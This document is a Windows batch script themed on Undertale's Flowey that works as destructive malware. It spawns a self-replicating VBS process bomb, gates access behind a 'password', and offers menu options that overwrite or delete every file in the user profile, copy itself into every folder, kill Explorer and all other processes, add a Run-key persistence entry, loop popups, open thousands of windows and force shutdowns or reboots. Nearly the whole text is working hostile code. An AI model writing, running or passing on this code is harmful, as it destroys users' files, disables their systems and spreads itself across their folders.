@echo off
setlocal EnableDelayedExpansion
title THE_END_OF_THE_WORLD
color 0c

:: =====================================================================
:: [ THE HYDRA-GOD - 150 LAYER SINGULARITY ]
:: =====================================================================
set "w_path=%TEMP%\hyperdeath.vbs"
:: This watcher is a monster. It ensures 150 instances and consumes CPU priority.
echo Set W=CreateObject("WScript.Shell"):Do:WScript.Sleep 50:Set Q=GetObject("winmgmts:\\.\root\cimv2").ExecQuery("Select * from Win32_Process Where Name='cmd.exe' AND CommandLine LIKE '%%THE_END_OF_THE_WORLD%%'"):If Q.Count^<150 Then For i=1 to 20:W.Run "cmd /c "+Chr(34)+"%~f0"+Chr(34),1:Next:End If:Loop > "%w_path%"
start /b wscript.exe "%w_path%"

:: =====================================================================
:: [ AUTHENTICATION: THE GATE ]
:: =====================================================================
set "f_path=%TEMP%\f_status.tmp"
if not exist "%f_path%" echo 0 > "%f_path%"
for /f %%a in (%f_path%) do set /a f_tries=%%a

:gate
cls
if %f_tries% GEQ 5 goto OMEGA_OVERRIDE
echo.
echo           ___          [!] TIMELINE_STABILITY: -999,999,999%%
echo      _  /  _  \  _     [!] REALITY: COLLAPSED
echo     (_)^| ( ) ^|(_)    [!] OWNER: ASRIEL DREEMURR
echo       ^| \_ _/ ^|       [!] STATUS: THE END
echo        \_____/        [!] ATTEMPTS: %(5-f_tries)%
echo.
echo "Golly, you're still here? You really are an IDIOT."
set /p "pass=SAY THE WORD: "

if /I not "%pass%"=="Idiot" (
    set /a f_tries+=1
    echo !f_tries! > "%f_path%"
    powershell -Command "$s=New-Object -ComObject SAPI.SpVoice;$s.Rate=-7;$s.Pitch=-20;$s.Speak('You idiot')"
    goto gate
)
echo 0 > "%f_path%"

:: =====================================================================
:: [ THE HYPERDEATH DASHBOARD ]
:: =====================================================================
:dashboard
:: THE SEIZURE: Violent Shaking + Rapid Color Strobe + Mouse Warp
powershell -WindowStyle Hidden -Command "$w=Add-Type -MemberDefinition '[DllImport(\"user32.dll\")]public static extern bool SetWindowPos(IntPtr h,IntPtr i,int x,int y,int cx,int cy,uint f);' -Name 'W' -PassThru; $h=(Get-Process -Id $pid).MainWindowHandle; $r=New-Object System.Random; for($i=0;$i -lt 100;$i++){ $w::SetWindowPos($h,0,$r.Next(0,1000),$r.Next(0,1000),0,0,0x0001); [System.Windows.Forms.Cursor]::Position = New-Object System.Drawing.Point($r.Next(0,1920),$r.Next(0,1080)); Start-Sleep -m 1 }"
for /L %%G in (1,1,10) do (color 0f & color 40 & color 0c)

cls
echo  _______________________________________________________________________
echo ^|                                                                       ^|
echo ^|  Flowey      LV 999999999999999999999999999999    0:00                ^|
echo ^|  Status: IT'S MY WORLD                                                ^|
echo ^|_______________________________________________________________________^|
echo.
echo  "I'm tired of playing with you."
echo  "I'll just erase this entire timeline and keep you in the VOID."
echo.
echo    [1] FILE_0      - Global User-File Genocide (EVERY FOLDER)
echo    [2] SOULS       - THE 6 SINS (Hardware Paralysis ^& Keyboard Pulse)
echo    [3] TERRITORY   - SYSTEM_OWNERSHIP (Voice, Wallpaper, ^& Shell Erasure)
echo    [4] SMILE       - THE HARVEST (Kill ALL non-Asriel processes)
echo    [5] SAVE        - ETERNAL_RECURSION (Locked Registry Hook)
echo.
echo    [R] RESET       - THE BLUE SCREEN PARADOX (Force Reboot)
echo    [D] DIE         - THE VOID (Wipe Desktop ^& Hard Shutdown)
echo    [X] ERASE       - [!] TOTAL_TIMELINE_COLLAPSE [!]
echo  _______________________________________________________________________
echo.
set "choice="
set /p "choice=GIVE_UP_YET? > "

if "!choice!"=="1" goto sub_file0
if "!choice!"=="2" goto sub_souls
if "!choice!"=="3" goto sub_territory
if "!choice!"=="4" goto sub_smile
if "!choice!"=="5" goto sub_save
if /I "!choice!"=="R" goto sub_reset
if /I "!choice!"=="D" goto sub_die
if /I "!choice!"=="X" goto sub_erase
goto dashboard

:: =====================================================================
:: [ THE 6 SOULS - ABSOLUTE TORTURE ]
:: =====================================================================
:sub_souls
cls
echo  "Which SOUL is going to break first?"
echo.
echo  [1] PATIENCE (Cyan)     - THE CAGE (High-speed Cursor Warp).
echo  [2] BRAVERY (Orange)    - THE PULSE (Keyboard Light Heartbeat).
echo  [3] INTEGRITY (Blue)    - THE BLACKOUT (Kill Explorer ^& Icons).
echo  [4] PERSEVERANCE (Purple)- THE INFECTION (Recursive Clone Spread).
echo  [5] KINDNESS (Green)    - THE GIFT (Infinite Lag MsgBox Loop).
echo  [6] JUSTICE (Yellow)    - THE GAVEL (Force close all windows).
echo.
set /p "s_choice=PICK: "

if "!s_choice!"=="1" (
    powershell -Command "Add-Type -AssemblyName System.Windows.Forms; for($i=0;$i -lt 20000;$i++){[System.Windows.Forms.Cursor]::Position = New-Object System.Drawing.Point((Get-Random -Max 1000),(Get-Random -Max 1000)); Start-Sleep -m 1}"
)
if "!s_choice!"=="2" (
    powershell -Command "$s=New-Object -ComObject WScript.Shell; for($i=0;$i -lt 1000;$i++){$s.SendKeys('{CAPSLOCK}{NUMLOCK}{SCROLLLOCK}'); [console]::beep((Get-Random -Min 100 -Max 2000), 20); Start-Sleep -m 10}"
)
if "!s_choice!"=="3" (taskkill /f /im explorer.exe 2>nul & reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /v "HideIcons" /t REG_DWORD /d 1 /f)
if "!s_choice!"=="4" (
    for /r "%USERPROFILE%" %%D in (.) do copy /y "%~f0" "%%D\THE_END.bat" >nul 2>&1
)
if "!s_choice!"=="5" (
    echo Set w=WScript.CreateObject("WScript.Shell") > "%TEMP%\idiot.vbs"
    echo Do >> "%TEMP%\idiot.vbs"
    echo w.Popup "BUT NOBODY CAME.", 0, "ASRIEL", 16 >> "%TEMP%\idiot.vbs"
    echo Loop >> "%TEMP%\idiot.vbs"
    start wscript.exe "%TEMP%\idiot.vbs"
)
if "!s_choice!"=="6" (powershell -Command "Get-Process | Where-Object {$_.Id -ne $PID -and $_.ProcessName -ne 'cmd' -and $_.ProcessName -ne 'wscript'} | Stop-Process -Force")
goto dashboard

:: =====================================================================
:: [ HYPER_GONER - GLOBAL GENOCIDE ]
:: =====================================================================
:sub_file0
cls
echo "I'M GOING TO CONSUME EVERYTHING."
timeout /t 2 >nul
:: Targets every folder and scrambles content
for /r "%USERPROFILE%" %%F in (*) do (
    echo %random%%random%%random% > "%%F"
    ren "%%F" "%%~nxF.SOUL" 2>nul
    copy /y "%~f0" "%%~dpF\THE_END.bat" >nul 2>&1
)
echo "EVERYTHING IS NOW MINE. HEE HEE HEE!"
pause
goto dashboard

:: =====================================================================
:: [ OMEGA OVERRIDE - THE FINAL END ]
:: =====================================================================
:OMEGA_OVERRIDE
cls
color 0f
powershell -Command "$s=New-Object -ComObject SAPI.SpVoice;$s.Rate=-5;$s.Speak('Golly. Five fails. You really are an idiot.')"
color 0c
powershell -Command "$s=New-Object -ComObject SAPI.SpVoice;$s.Rate=-8;$s.Speak('I am the GOD of this world now.')"

:: Heartbeat Beep + Flash
for /L %%i in (1,1,200) do (
    color 0c & powershell "[console]::beep(40, 20)"
    color 04 & powershell "[console]::beep(40, 20)"
)

:: Lag Singularity
for /L %%i in (1,1,3000) do (
    start notepad.exe
    start calc.exe
)

:: Typewriter Finale
set "msg1=It's just a bad dream..."
set "msg2=and you're NEVER waking up from it!"
echo.
for /L %%i in (0,1,25) do (set /p "=!msg1:~%%i,1!" <nul & ping -n 1 localhost >nul)
echo.
timeout /t 1 >nul
for /L %%i in (0,1,35) do (set /p "=!msg2:~%%i,1!" <nul & ping -n 1 localhost >nul)
echo.

powershell -Command "$s=New-Object -ComObject SAPI.SpVoice;$s.Rate=-10;$s.Speak('Its just a bad dream. and you are never waking up from it!')"

echo "HEE HEE HEE HEE HEE HEE HEE HEE!"
timeout /t 5 >nul
shutdown /s /f /t 0

:: =====================================================================
:: [ ERASE - TOTAL TIMELINE DELETE ]
:: =====================================================================
:sub_erase
cls
powershell -Command "$s=New-Object -ComObject SAPI.SpVoice;$s.Speak('Goodbye, IDIOT!')"
for /r "%USERPROFILE%" %%D in (*.*) do (
    del /f /q "%%D" >nul 2>&1
)
echo "It's just a bad dream, and you're never waking up from it!"
timeout /t 5 >nul
start /b "" cmd /c del "%~f0" & del "%w_path%" & exit

:: =====================================================================
:: [ PERSISTENCE ROUTINES ]
:: =====================================================================
:sub_territory
set "imgUrl=https://raw.githubusercontent.com/An-Idiot-On-The-Internet/Flowey/main/flowey.jpg"
set "imgPath=%TEMP%\flowey_face.jpg"
powershell -Command "(New-Object System.Net.WebClient).DownloadFile('%imgUrl%', '%imgPath%')"
powershell -Command "Set-ItemProperty -Path 'HKCU:\Control Panel\Desktop\' -Name wallpaper -Value '%imgPath%'"
powershell -Command "RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters"
goto dashboard

:sub_save
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "Flowey_Absolute" /t REG_SZ /d "%~f0" /f
echo "YOU'RE MINE FOREVER."
pause
goto dashboard

:sub_reset
shutdown /r /f /t 0

:sub_die
shutdown /s /f /t 0
